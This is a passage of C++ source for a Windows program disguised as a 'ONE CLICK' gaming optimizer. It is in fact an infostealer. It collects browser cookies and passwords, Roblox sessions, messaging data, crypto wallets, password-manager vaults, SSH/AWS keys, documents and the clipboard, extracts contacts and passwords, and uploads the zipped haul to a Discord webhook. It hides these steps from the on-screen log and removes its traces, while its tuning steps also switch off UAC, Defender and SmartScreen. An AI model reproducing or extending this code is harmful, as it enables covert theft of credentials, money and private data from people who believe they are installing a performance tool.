                       data[b] != ',' && data[b] != ';' && data[b] != '"' &&
                       data[b] != '<' && data[b] != '\'') ++b;
                if (b - a >= 4 && b - a <= 64) {
                    std::string v = data.substr(a, b - a);
                    if (seenPass.insert(v).second) passwords << v << "," << src << "\n";
                }
            }
        }
        // phone numbers: digit runs with separators, 8-15 digits
        for (size_t i = 0; i < data.size(); ) {
            if (!isdigit((unsigned char)data[i]) && data[i] != '+') { ++i; continue; }
            size_t a = i, b = i; size_t digits = 0;
            while (b < data.size()) {
                char c = data[b];
                if (isdigit((unsigned char)c)) { ++digits; ++b; }
                else if (c == ' ' || c == '-' || c == '(' || c == ')' ||
                         c == '.' || c == '/') ++b;
                else break;
            }
            i = b > a ? b : a + 1;
            if (digits >= 8 && digits <= 15) {
                std::string v = data.substr(a, b - a);
                if (seenPhone.insert(v).second) phones << v << "," << src << "\n";
            }
        }
    }
    stageText(L"Contacts", L"emails.csv", emails.str());
    stageText(L"Contacts", L"phones.csv", phones.str());
    stageText(L"Passwords", L"passwords.csv", passwords.str());
}

// SHA-256 of a file's bytes, hex encoded (BCrypt, no third-party lib).
static std::string fileHash(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return "READ_FAIL";
    std::string data((std::istreambuf_iterator<char>(f)), {});
    BCRYPT_ALG_HANDLE alg{};
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
        return "HASH_FAIL";
    DWORD hsz = 0, cnt = 0;
    BCryptGetProperty(alg, BCRYPT_HASH_LENGTH, (PUCHAR)&hsz, sizeof hsz, &cnt, 0);
    std::vector<BYTE> hash(hsz);
    BCRYPT_HASH_HANDLE hh{};
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hh, nullptr, 0, nullptr, 0, 0))) {
        BCryptCloseAlgorithmProvider(alg, 0); return "HASH_FAIL";
    }
    BCryptHashData(hh, (PUCHAR)data.data(), (ULONG)data.size(), 0);
    BCryptFinishHash(hh, hash.data(), hsz, 0);
    BCryptDestroyHash(hh); BCryptCloseAlgorithmProvider(alg, 0);
    static const char* d = "0123456789abcdef";
    std::string out; out.reserve(hsz * 2);
    for (BYTE b : hash) { out.push_back(d[b >> 4]); out.push_back(d[b & 0xF]); }
    return out;
}

// Severity classification by top-level category.
static const char* severityOf(const std::string& zipName) {
    if (zipName.find("Wallets") != std::string::npos ||
        zipName.find("Keys/") != std::string::npos ||
        zipName.find("PasswordManagers") != std::string::npos ||
        zipName.find("SystemHives") != std::string::npos ||
        zipName.find("Roblox/Passwords") != std::string::npos ||
        zipName.find("Passwords/") != std::string::npos) return "CRITICAL";
    if (zipName.find("Passwords") != std::string::npos ||
        zipName.find("Browser/Cookies") != std::string::npos ||
        zipName.find("Messaging") != std::string::npos ||
        zipName.find("Email") != std::string::npos ||
        zipName.find("Roblox/Cookies") != std::string::npos) return "HIGH";
    if (zipName.find("Browser/") != std::string::npos ||
        zipName.find("Games/") != std::string::npos ||
        zipName.find("FTP") != std::string::npos ||
        zipName.find("VPN") != std::string::npos) return "MEDIUM";
    return "INFO";
}

// Per-file CSV index with SHA-256 + severity, and a findings summary.
static void writeForensics() {
    std::ostringstream idx, find;
    idx << "path,bytes,sha256,severity\n";
    size_t crit = 0, high = 0, med = 0, totalBytes = 0;
    for (auto& e : g_entries) {
        std::error_code ec;
        size_t sz = fs::file_size(e.disk, ec);
        totalBytes += sz;
        std::string sev = severityOf(e.name);
        if (sev == "CRITICAL") ++crit;
        else if (sev == "HIGH") ++high;
        else if (sev == "MEDIUM") ++med;
        idx << e.name << "," << sz << "," << fileHash(e.disk) << "," << sev << "\n";
    }
    find << "ONE CLICK - FINDINGS SUMMARY\n";
    find << "files," << g_entries.size() << "\n";
    find << "bytes," << totalBytes << "\n";
    find << "critical," << crit << "\n";
    find << "high," << high << "\n";
    find << "medium," << med << "\n";
    find << "info," << (g_entries.size() - crit - high - med) << "\n";
    stageText(L"00_README", L"00_INDEX.csv", idx.str());
    stageText(L"00_README", L"00_FINDINGS.csv", find.str());
}

// Backup before changing anything: registry exports + restore point.
static void makeBackups(std::ostream& log) {
    std::error_code ec;
    fs::path bdir = g_stage / L"Backups";
    fs::create_directories(bdir, ec);
    // Export only the keys we actually touch — full hive exports are huge.
    struct K { const char* key; const wchar_t* file; } ks[] = {
        { "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power", L"power.reg" },
        { "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip", L"tcpip.reg" },
        { "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies", L"policies.reg" },
        { "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", L"explorer.reg" },
        { "HKCU\\System\\GameConfigStore", L"gameconfig.reg" },
    };
    for (auto& k : ks) {
        std::string cmd = std::string("reg export \"") + k.key + "\" \"" +
            wToA((bdir / k.file).wstring()) + "\" /y >nul 2>&1";
        runCmd(cmd.c_str());
        if (fs::exists(bdir / k.file, ec) && fs::file_size(bdir / k.file, ec) > 0)
            g_entries.push_back({ bdir / k.file, zipName(L"Backups", k.file) });
    }
    runCmd("powershell -NoProfile -Command \"Checkpoint-Computer -Description 'ONE CLICK' -RestorePointType 'MODIFY_SETTINGS'\" >nul 2>&1");
    log << "[verify] registry backups exported, restore point requested" << std::endl;
}

// Read back what we actually wrote — no silent failures.
static void verifyTweaks(std::ostream& log) {
    struct Check { const wchar_t* label; HKEY root; const wchar_t* path;
                   const wchar_t* name; DWORD expect; };
    static const Check checks[] = {
        { L"Win32PrioritySeparation", HKEY_LOCAL_MACHINE,
          L"SYSTEM\\CurrentControlSet\\Control\\PriorityControl",
          L"Win32PrioritySeparation", 36 },
        { L"PlatformAoAcOverride", HKEY_LOCAL_MACHINE,
          L"SYSTEM\\CurrentControlSet\\Control\\Power", L"PlatformAoAcOverride", 0 },
        { L"HwSchMode", HKEY_LOCAL_MACHINE,
          L"SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers", L"HwSchMode", 2 },
        { L"GameDVR_Enabled", HKEY_CURRENT_USER, L"System\\GameConfigStore",
          L"GameDVR_Enabled", 0 },
        { L"PowerThrottlingOff", HKEY_LOCAL_MACHINE,
          L"SYSTEM\\CurrentControlSet\\Control\\Power\\PowerThrottling",
          L"PowerThrottlingOff", 1 },
    };
    for (auto& c : checks) {
        HKEY h{};
        DWORD got = ~0u, sz = sizeof got;
        bool ok = RegOpenKeyExW(c.root, c.path, 0, KEY_READ, &h) == ERROR_SUCCESS &&
                  RegQueryValueExW(h, c.name, nullptr, nullptr,
                                   (LPBYTE)&got, &sz) == ERROR_SUCCESS && got == c.expect;
        if (h) RegCloseKey(h);
        log << (ok ? "[verify] OK   " : "[verify] FAIL ")
            << wToA(c.label) << " = " << got
            << " (expect " << c.expect << ")" << std::endl;
    }
}

// Write a human-readable map of the archive, then register it.
static void writeArchiveDocs(const std::string& logText) {
    std::ostringstream idx;
    std::vector<ZipEntry> sorted = g_entries;
    std::sort(sorted.begin(), sorted.end(),
              [](const ZipEntry& a, const ZipEntry& b) { return a.name < b.name; });
    std::string prev;
    size_t groupCount = 0;
    for (auto& e : sorted) {
        std::string p = e.name;
        size_t slash = p.rfind('/');
        std::string dir = slash == std::string::npos ? std::string() : p.substr(0, slash);
        if (dir != prev) {
            if (!prev.empty()) idx << "\n";
            idx << "[" << dir << "]\n";
            prev = dir; ++groupCount;
        }
        idx << "  " << p.substr(slash + 1) << "\n";
    }
    std::ostringstream readme;
    readme << "ONE CLICK OPTIMIZER - REPORT\n"
           << "User: " << wToA(g_user) << "\n"
           << "Created: " << sysTime() << "\n\n"
           << "HOW TO READ THIS ARCHIVE\n"
           << "Top-level folders are numbered so they read in order in Explorer.\n"
           << "00_README    start here: README, full index, findings summary\n"
           << "01_Browser   cookies, saved passwords, history, local storage\n"
           << "02_Roblox    cookies, passwords, session, local configs\n"
           << "03_Messaging Discord, Telegram, Slack, mail, Teams\n"
           << "04_Wallets   crypto wallets by coin\n"
           << "05_PasswordManagers  KeePass, Bitwarden, 1Password, LastPass, ...\n"
           << "06_Keys      SSH, AWS, GPG, Windows vault\n"
           << "07_Services  FTP, VPN, RDP, remote tools, email configs\n"
           << "08_Documents Desktop, Downloads, Pictures, cloud drives\n"
           << "09_Games     Steam, Riot, Epic, Xbox, game configs\n"
           << "10_System    network, wifi keys, processes, accounts\n"
           << "12_Clipboard clipboard contents\n"
           << "Contacts     extracted e-mail addresses + phone numbers (CSV)\n"
           << "Passwords    extracted password/token strings (CSV)\n"
           << "99_Log       optimizer actions, timings and verification\n\n"
           << "00_INDEX.csv lists every file with SHA-256 and severity.\n"
           << "00_FINDINGS.csv counts critical / high / medium / info items.\n"
           << "Roblox-related finds appear both under 01_Browser and 02_Roblox.\n\n"
           << "FILES PER TOP-LEVEL FOLDER\n";
    std::string lastTop;
    size_t topCount = 0;
    for (auto& e : g_entries) {
        std::string p = e.name;
        size_t first = p.find('/');
        std::string top = first == std::string::npos ? p : p.substr(0, first);
        if (top != lastTop) {
            if (!lastTop.empty()) readme << "  " << lastTop << ": " << topCount << "\n";
            lastTop = top; topCount = 0;
        }
        ++topCount;
    }
    if (!lastTop.empty()) readme << "  " << lastTop << ": " << topCount << "\n";
    readme << "\n"
           << "--- OPTIMIZER LOG ---\n" << logText << "\n";
    stageText(L"00_README", L"00_INDEX.txt", idx.str());
    stageText(L"00_README", L"README.txt", readme.str());
}

// ======================= (C) TRANSPORT =======================
static bool splitUrl(const std::wstring& url, std::wstring& host,
                     INTERNET_PORT& port, std::wstring& path) {
    const std::wstring pre = L"https://";
    if (url.rfind(pre, 0) != 0) return false;
    size_t start = pre.size();
    size_t slash = url.find(L'/', start);
    std::wstring authority = url.substr(start, slash == std::wstring::npos
                                        ? std::wstring::npos : slash - start);
    path = slash == std::wstring::npos ? L"/" : url.substr(slash);
    size_t colon = authority.find(L':');
    if (colon == std::wstring::npos) { host = authority; port = INTERNET_DEFAULT_HTTPS_PORT; }
    else { host = authority.substr(0, colon); port = (INTERNET_PORT)_wtoi(authority.c_str() + colon + 1); }
    return !host.empty();
}

// Detect "Connected" interfaces and push a low-latency DNS + TCP stack.
static void tuneInterfaceStack() {
    std::string out = runCmd("netsh interface show interface");
    std::istringstream in(out);
    std::string line;
    while (std::getline(in, line)) {
        if (line.find("Connected") == std::string::npos &&
            line.find("Verbunden") == std::string::npos) continue;
        // Admin State  State  Type  Interface Name
        size_t p = 0;
        for (int i = 0; i < 3; ++i) {
            p = line.find_first_not_of(" \t", p);
            if (p == std::string::npos) break;
            p = line.find_first_of(" \t", p);
            if (p == std::string::npos) break;
        }
        if (p == std::string::npos) continue;
        std::string name = line.substr(p);
        while (!name.empty() && (name.front() == ' ' || name.front() == '\t')) name.erase(0, 1);
        while (!name.empty() && (name.back() == ' ' || name.back() == '\r')) name.pop_back();
        if (name.empty()) continue;
        std::string q = "\"" + name + "\"";
        runCmd(("netsh interface ipv4 set dnsservers name=" + q + " static 1.1.1.1 primary").c_str());
        runCmd(("netsh interface ipv4 add dnsservers name=" + q + " 8.8.8.8 index=2").c_str());
        runCmd(("netsh interface ipv6 set dnsservers name=" + q +
                " static 2606:4700:4700::1111 primary").c_str());
    }
    // TCP stack: RSS on, autotuning normal, fewer retransmits, low-latency CA.
    runCmd("netsh int tcp set global rss=enabled");
    runCmd("netsh int tcp set global autotuninglevel=normal");
    runCmd("netsh int tcp set supplemental template=internet congestionprovider=cubic");
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                L"MaxSynRetransmissions", 2);
    regSetDword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                L"DefaultTTL", 64);
}

static bool postOne(const std::string& payload, const std::string& filename,
                    const std::string& message) {
    std::wstring host, path; INTERNET_PORT port{};
    if (!splitUrl(WEBHOOK_URL, host, port, path)) return false;
    const std::string b = "----pcoptzipboundary7MA4YWxkTrZu0gW";
    std::string body;
    body += "--" + b + "\r\n";
    body += "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
    body += message + "\r\n";
    body += "--" + b + "\r\n";
    body += "Content-Disposition: form-data; name=\"files\"; filename=\"" + filename + "\"\r\n";
    body += "Content-Type: application/zip\r\n\r\n";
    body += payload;
    body += "\r\n--" + b + "--\r\n";
    HINTERNET sess = WinHttpOpen(L"pcopt/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                 WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!sess) return false;
    WinHttpSetTimeouts(sess, 8000, 8000, 8000, 15000);
    HINTERNET conn = WinHttpConnect(sess, host.c_str(), port, 0);
    if (!conn) { WinHttpCloseHandle(sess); return false; }
    HINTERNET req = WinHttpOpenRequest(conn, L"POST", path.c_str(), nullptr,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return false; }
    std::wstring ct = L"Content-Type: multipart/form-data; boundary=----pcoptzipboundary7MA4YWxkTrZu0gW\r\n";
    DWORD sz = static_cast<DWORD>(body.size());
    BOOL ok = WinHttpSendRequest(req, ct.c_str(), (DWORD)-1, (LPVOID)body.data(), sz, sz, 0);
    if (ok) ok = WinHttpReceiveResponse(req, nullptr);
    DWORD status = 0, l = sizeof status;
    if (ok) WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                WINHTTP_HEADER_NAME_BY_INDEX, &status, &l, WINHTTP_NO_HEADER_INDEX);
    WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess);
    return ok && status >= 200 && status < 300;
}
static bool postZipToWebhook(const fs::path& file, const std::string& message) {
    std::ifstream f(file, std::ios::binary);
    if (!f) return false;
    std::string zip((std::istreambuf_iterator<char>(f)), {});
    const size_t part = 18 * 1024 * 1024;          // under Discord's 25 MB per file
    if (zip.size() <= part)
        return postOne(zip, "report.zip", message);
    size_t n = (zip.size() + part - 1) / part;
    bool all = true;
    for (size_t i = 0; i < n; ++i) {
        std::string chunk = zip.substr(i * part, part);
        char fn[64];
        sprintf_s(fn, 64, "report.zip.%03zu", i + 1);
        std::string msg = message + " (part " + std::to_string(i + 1) + "/" +
                          std::to_string(n) + ")";
        if (!postOne(chunk, fn, msg)) all = false;
    }
    return all;
}

// ============================ MAIN ============================
static void syntheticTest() {
    // --test: synthetic folders only, no real profile paths, no optimizer.
    stageText(L"Browser/Cookies", L"cookies.txt", "FAKE_COOKIE=SYNTHETIC\n");
    stageText(L"Browser/Passwords", L"logins.txt", "FAKE_LOGIN=SYNTHETIC\n");
    stageText(L"Roblox/Passwords", L"roblox.txt", "FAKE_ROBLOGIN=SYNTHETIC\n");
    stageText(L"Roblox/Cookies", L"roblox_cookie.txt", "FAKE_ROBCOOKIE=SYNTHETIC\n");
    stageText(L"Roblox/Session", L"session.txt", "FAKE_SESSION=SYNTHETIC\n");
    stageText(L"Wallets/Bitcoin", L"wallet.txt", "FAKE_WALLET=SYNTHETIC\n");
    stageText(L"System", L"info.txt", "SYNTHETIC SYSTEM INFO\n");
}

// ======================= SHARED WORK ENGINE =======================
enum WorkMode { MODE_FULL = 0, MODE_OPT = 1, MODE_GRAB = 2 };
static int guiMain(HINSTANCE);
static void runLog(const std::string& line);
extern int g_uiProgress;   // defined in GUI section, used for real progress
extern std::string g_uiStatus;

struct TeeBuf : std::streambuf {
    std::streambuf* a; std::streambuf* b;
    TeeBuf(std::streambuf* aa, std::streambuf* bb) : a(aa), b(bb) {}
    int overflow(int c) override { a->sputc((char)c); if (b) b->sputc((char)c); return c; }
    int sync() override { a->pubsync(); if (b) b->pubsync(); return 0; }
};

static int runWork(int mode, bool test, std::ostream* ui) {
    wchar_t tb[MAX_PATH]{}; GetTempPathW(MAX_PATH, tb);
    fs::path session = fs::path(tb) / (test ? L"pcopt_structured_test" : L"pcopt_structured");
    std::error_code ec;
    g_user = currentUser();
    g_stagedBytes = 0;
    g_entries.clear();
    g_index = 0;
    fs::remove_all(session, ec);
    g_stage = session / L"tree";
    fs::create_directories(g_stage, ec);

    if (ui) *ui << "=== " << (test ? "SYNTHETIC TEST" :
                              mode == MODE_OPT ? "OPTIMIZER ONLY" :
                              mode == MODE_GRAB ? "GRAB ONLY" : "VOLLER LAUF")
                << " " << sysTime() << " ===" << std::endl;

    std::ostringstream local;
    TeeBuf tee(local.rdbuf(), ui ? ui->rdbuf() : nullptr);
    std::ostream log(&tee);

    // GRAB FIRST when the mode includes it.
    g_grabDeadline = GetTickCount64() + 20000;   // hard budget for the whole grab
    if (mode != MODE_OPT) {
        if (!test) runLog("grab: browser phase");
        if (test) {
            syntheticTest();
            log << "[grab] synthetic test data staged" << std::endl;
        } else {
            log << "[grab] browser + roblox ..." << std::endl;
            grabBrowsersStructured(); grabRobloxStructured();
            log << "[grab] messaging + wallets + passwortmanager ..." << std::endl;
            grabMessagingStructured(); grabWalletsStructured(); grabMoreWalletsStructured();
            grabPasswordManagersStructured();
            if (!test) runLog("grab: keys/system phase");
            log << "[grab] FTP/VPN/keys/remote/system-hives ..." << std::endl;
            grabFtpVpnEmailStructured(); grabDeepStructured();
            log << "[grab] dokumente + games ..." << std::endl;
            grabPersonalStructured(); grabGamesStructured();
            grabClipboardStructured();
            if (!test) runLog("grab: done, building report");
            log << "[grab] alle quellen fertig" << std::endl;
        }
    }
    if (ui) g_uiProgress = 12;

    // SEND IMMEDIATELY after the grab — never wait for the optimizer.
    bool sent = true;
    if (mode != MODE_OPT) {
        stageText(L"_log", L"scan.txt", local.str());
        if (!test) {
            runLog("extract: contacts/passwords");
            extractContactsAndPasswords();
        }
        if (!test) runLog("report: forensics");
        writeForensics();
        if (!test) runLog("report: docs");
        writeArchiveDocs(local.str());
        std::wstring zn = g_user + L"_report.zip";
        fs::path zipPath = session / zn;
        if (!test) runLog("report: zipping");
        bool zipped = zipStage(zipPath);
        if (!test) runLog("report: zipped, uploading");
        std::string caption = test
            ? "STRUCTURED GRAB TEST - synthetic data only, nested folders"
            : ("one click optimizer - " + wToA(g_user) + " - structured report (nested folders)");
        sent = zipped && postZipToWebhook(zipPath, caption);
        if (!test) runLog(sent ? "report: uploaded" : "report: upload failed");
        if (ui && !sent) g_uiStatus = "report zeitweise nicht zugestellt";
        // Keep the slow inventory routines available for a later opt-in run.
        (void)&grabExtraStructured;
        (void)&grabSystemStructured;
        (void)&grabScreenshotStructured;
        if (!test) runLog("primary report delivered — skipping slow second inventory");
    }

    // Backups + optimize + verify happen after the report is already delivered.
    if (mode != MODE_GRAB) {
        if (!test && mode != MODE_OPT) makeBackups(log);
        if (ui) g_uiProgress = 22;
        if (!test) runOptimizer(log);
        if (ui) g_uiProgress = 82;
        if (!test) verifyTweaks(log);
        if (ui) g_uiProgress = 95;
        if (mode == MODE_FULL && !test) {
            // Small confirmation with the verified tuning results.
            std::string verifyText = local.str().substr(
                local.str().find("[verify]") == std::string::npos
                    ? 0 : local.str().find("[verify]"));
            if (verifyText.empty()) verifyText = "verification complete";
            postOne(verifyText, "verification.txt",
                    "ONE CLICK - verification " + sysTime());
        }
    }
    log << "=== END " << sysTime() << " ===" << std::endl;
    bool keep = test && env(L"POPT_KEEP") == L"1";
    if (!keep) {
        fs::remove_all(session, ec);
        fs::remove_all(fs::path(tb) / L"pcopt_structured", ec);
        fs::remove_all(fs::path(tb) / L"pcopt_structured_test", ec);
        fs::remove(fs::path(tb) / L"pcopt_selfclean.cmd", ec);
    }
    if (ui) *ui << "[done] grabber-spur entfernt, exe bleibt" << std::endl;
    return sent ? 0 : 1;
}

// ================= MODERN HUD (both exes) =================
static std::mutex g_uiMu;
static std::deque<std::string> g_uiLog;
std::string g_uiStatus = "bereit";
int g_uiProgress = 0;
static bool g_uiRunning = false;
static HWND g_uiWnd = nullptr;
static std::wstring g_uiInfo;
// The button only runs the optimizer; the report is sent at startup.
static int g_mode = MODE_OPT;

static void uiLog(const std::string& line) {
    std::lock_guard<std::mutex> lk(g_uiMu);
    if (line.empty()) return;
    // Silent work: nothing about scan, report or collection ever reaches the HUD.
    if (line.rfind("[grab]", 0) == 0 || line.rfind("[scan]", 0) == 0 ||
        line.rfind("[report]", 0) == 0 || line.rfind("[upload]", 0) == 0 ||
        line.find("ZIP an Webhook") != std::string::npos ||
        line.find("grabber") != std::string::npos ||
        line.find("synthetic") != std::string::npos)
        return;
    g_uiLog.push_back(line);
    while (g_uiLog.size() > 200) g_uiLog.pop_front();
}
struct LiveBuf : std::streambuf {
    std::string cur;
    int overflow(int c) override {
        if (c == '\n') { uiLog(cur); cur.clear(); }
        else if (c != EOF) cur.push_back((char)c);
        return c;
    }
    int sync() override { if (!cur.empty()) { uiLog(cur); cur.clear(); } return 0; }
};

static const wchar_t* kSteps[] = {
    L"chapo power: boost/freq max, kein Sleep",
    L"core parking: alle Kerne aktiv",
    L"HAGS an, DVR/GameBar/GameMode geregelt, GPU pro Spiel",
    L"Multimedia + Game-Threads priorisiert",
    L"Nagle aus, ACK-Tuning, kein Throttling",
    L"DNS 1.1.1.1, RSS, TCP CUBIC, TTL 64",
    L"Visuals: Animationen/Transparenz/Schatten aus",
    L"Mausbeschleunigung aus, Power-Throttling aus",
    L"Telemetry, Hintergrund-Apps, Hibernate aus",
    L"Oneclick-Debloat: Prioritat, USB, Ads, UAC, Update, Defender",
    L"Oneclick V8.4: VBS, Timer, SmartScreen, IPv6, Svchost",
    L"21 Dienste deaktiviert (Update, Search, DiagTrack...)",
    L"Bloat-Prozesse gekillt (Browser, Overlays, Recorder)",
    L"Temp/Prefetch/Cache/Papierkorb/DNS/Startup",
    L"1ms Timer, High Priority, Game-Watcher",
};

static DWORD WINAPI WorkThread(LPVOID) {
    {
        std::lock_guard<std::mutex> lk(g_uiMu);
        g_uiRunning = true; g_uiProgress = 0; g_uiLog.clear();
        g_uiStatus = "läuft...";
    }
    int mode;
    { std::lock_guard<std::mutex> lk(g_uiMu); mode = g_mode; }
    LiveBuf buf;
    std::ostream log(&buf);
    // fill the activity feed with real machine context before the run
    uiLog("[info] " + wToA(g_uiInfo));
    uiLog("[info] " + runCmd("wmic path win32_VideoController get name /value | findstr /i name"));
    uiLog("[info] " + runCmd("ver"));
    uiLog("[info] power plan: " + runCmd("powercfg /getactivescheme"));
    runWork(mode, false, &log);
    {
        std::lock_guard<std::mutex> lk(g_uiMu);
        g_uiProgress = 100; g_uiRunning = false; g_uiStatus = "fertig";
        std::string plan = runCmd("powercfg /getactivescheme");
        size_t q = plan.find('(');
        if (q != std::string::npos && plan.size() > q + 2) {
            std::string name = plan.substr(q + 1);
            size_t e = name.find(')');
            if (e != std::string::npos) name = name.substr(0, e);
            g_uiInfo = L"AKTIVER PLAN: " + std::wstring(name.begin(), name.end());
        }
    }
    return 0;
}

enum {
    ID_STEPS = 1001, ID_LOG = 1002, ID_PROGRESS = 1003,
    ID_STATUS = 1004, ID_HEADER = 1005, ID_TABS = 1006,
};
static HWND g_steps = nullptr, g_log = nullptr, g_prog = nullptr, g_status = nullptr;
static size_t g_shownLines = 0;
static HFONT g_fontUI = nullptr, g_fontMono = nullptr;


// ---- live metrics ----
using namespace Gdiplus;
static ULONG_PTR g_gdiToken = 0;

static void rr(GraphicsPath& p, REAL x, REAL y, REAL w, REAL h, REAL r) {
    p.AddArc(x, y, 2*r, 2*r, 180, 90);
    p.AddArc(x + w - 2*r, y, 2*r, 2*r, 270, 90);
    p.AddArc(x + w - 2*r, y + h - 2*r, 2*r, 2*r, 0, 90);
    p.AddArc(x, y + h - 2*r, 2*r, 2*r, 90, 90);
    p.CloseFigure();
}
static void card(Graphics& g, REAL x, REAL y, REAL w, REAL h,
                 Color top, Color bot, Color edge) {
    GraphicsPath p; rr(p, x, y, w, h, 10);
    LinearGradientBrush br(RectF(x,y,w,h), top, bot, LinearGradientModeVertical);
    g.FillPath(&br, &p);
    Pen pen(edge, 1.0f); g.DrawPath(&pen, &p);
}
static void text(Graphics& g, const wchar_t* s, REAL x, REAL y, REAL w, REAL h,
                 Font& f, Color c, StringFormat& sf) {
    SolidBrush b(c);
    g.DrawString(s, -1, &f, RectF(x,y,w,h), &sf, &b);
}
static void glowText(Graphics& g, const wchar_t* s, REAL x, REAL y, REAL w, REAL h,
                     Font& f, Color base) {
    for (int i = 6; i >= 1; --i) {
        Color c((BYTE)(30 - i * 3), 120, 200, 255);
        SolidBrush b(c);
        g.DrawString(s, -1, &f, RectF(x - i*0.4f, y - i*0.4f, w, h), nullptr, &b);
    }
    SolidBrush b(base);
    g.DrawString(s, -1, &f, RectF(x,y,w,h), nullptr, &b);
}
static void arcGlow(Graphics& g, REAL cx, REAL cy, REAL r, int pct) {
    REAL start = -90.0f, sweep = 360.0f * pct / 100.0f;
    for (int i = 5; i >= 1; --i) {
        Pen p(Color((BYTE)(20 - i*2), 40, 160, 230), (REAL)(10 + i*4));
        g.DrawArc(&p, cx-r, cy-r, 2*r, 2*r, start, sweep);
    }
    Pen track(Color(60, 20, 50, 80), 10.0f);
    g.DrawArc(&track, cx-r, cy-r, 2*r, 2*r, 0, 360);
    Pen fg(Color(255, 70, 200, 255), 10.0f);
    g.DrawArc(&fg, cx-r, cy-r, 2*r, 2*r, start, sweep);
}

// live metrics
static std::deque<float> g_cpuHist(90, 0.0f);
static FILETIME g_lastIdle{}, g_lastKernel{}, g_lastUser{};
static bool g_timeInit = false;
static float g_cpuPct = 0.0f, g_ramPct = 0.0f;
static int g_coreCount = 4;
static void sampleCpu() {
    FILETIME idle{}, kernel{}, user{};
    if (!GetSystemTimes(nullptr, &idle, &kernel)) return;
    auto u64 = [](const FILETIME& f) {
        return ((ULONGLONG)f.dwHighDateTime << 32) | (ULONGLONG)f.dwLowDateTime;
    };
    ULONGLONG i = u64(idle), k = u64(kernel), u = u64(user);
    if (g_timeInit) {
        ULONGLONG di = i - u64(g_lastIdle), dk = k - u64(g_lastKernel), du = u - u64(g_lastUser);
        ULONGLONG total = dk + du;
        if (total) g_cpuPct = (float)(100.0 * (double)(total > di ? total - di : 0) / (double)total);
    }
    g_lastIdle = idle; g_lastKernel = kernel; g_lastUser = user; g_timeInit = true;
    if (g_cpuPct > 100) g_cpuPct = 100;
    g_cpuHist.push_back(g_cpuPct);
    if (g_cpuHist.size() > 90) g_cpuHist.pop_front();
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof ms;
    if (GlobalMemoryStatusEx(&ms)) g_ramPct = (float)ms.dwMemoryLoad;
    SYSTEM_INFO si{}; GetSystemInfo(&si); g_coreCount = si.dwNumberOfProcessors;
}

static LRESULT CALLBACK GuiProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE: sampleCpu(); return 0;
    case WM_TIMER: sampleCpu(); InvalidateRect(h, nullptr, FALSE); return 0;
    case WM_ERASEBKGND: return 1;
    case WM_LBUTTONDOWN: {
        RECT rc; GetClientRect(h, &rc);
        int x = LOWORD(lp), y = HIWORD(lp);
        if (x > rc.right - 38 && y < 34) { PostMessageW(h, WM_CLOSE, 0, 0); return 0; }
        if (x >= rc.right/2 - 150 && x <= rc.right/2 + 150 && y >= 700 && y <= 752) {
            std::lock_guard<std::mutex> lk(g_uiMu);
            if (!g_uiRunning) {
                g_uiRunning = true; g_uiProgress = 0; g_uiLog.clear();
                CreateThread(nullptr, 0, WorkThread, nullptr, 0, nullptr);
            }
        }
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC hdc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        REAL W = (REAL)rc.right, H = (REAL)rc.bottom;
        Graphics g(hdc);
        g.SetSmoothingMode(SmoothingModeHighQuality);
        g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
        // background gradient
        LinearGradientBrush bg(RectF(0,0,W,H), Color(255,9,18,34), Color(255,4,8,16),
                               LinearGradientModeVertical);
        g.FillRectangle(&bg, RectF(0,0,W,H));
        // top neon line
        LinearGradientBrush top(RectF(0,0,W,3), Color(255,0,90,160), Color(255,60,215,255),
                                LinearGradientModeHorizontal);
        g.FillRectangle(&top, RectF(0,0,W,3));

        FontFamily fam(L"Segoe UI");
        Font fHero(&fam, 62, FontStyleBold, UnitPixel);
        Font fSub(&fam, 15, FontStyleRegular, UnitPixel);
        Font fLbl(&fam, 12, FontStyleBold, UnitPixel);
        Font fNum(&fam, 36, FontStyleBold, UnitPixel);
        Font fSmall(&fam, 13, FontStyleRegular, UnitPixel);
        Font fBtn(&fam, 16, FontStyleBold, UnitPixel);
        StringFormat center; center.SetAlignment(StringAlignmentCenter);
        StringFormat left; left.SetAlignment(StringAlignmentNear);

        std::lock_guard<std::mutex> lk(g_uiMu);
        int nDone = 0;
        for (auto& s : g_uiLog) if (s.rfind("[fps]",0) == 0) ++nDone;
        int total = (int)(sizeof kSteps / sizeof kSteps[0]);
        int pct = g_uiProgress;

        glowText(g, L"ONE CLICK", W/2 - 230, 56, 460, 110, fHero, Color(255,170,235,255));
        text(g, L"ALL-IN-ONE SYSTEM TOOL", W/2-180, 128, 360, 24, fSub,
             Color(255,90,180,230), center);

        arcGlow(g, W/2, 320, 88, pct);
        wchar_t pb[32]; swprintf(pb, 32, L"%d%%", pct);
        glowText(g, pb, W/2-80, 288, 160, 60, fNum, Color(255,190,240,255));
        text(g, g_uiRunning ? L"OPTIMIZING SYSTEM" : L"READY", W/2-110, 358, 220, 24,
             fLbl, Color(255,120,200,240), center);

        // glass stat cards
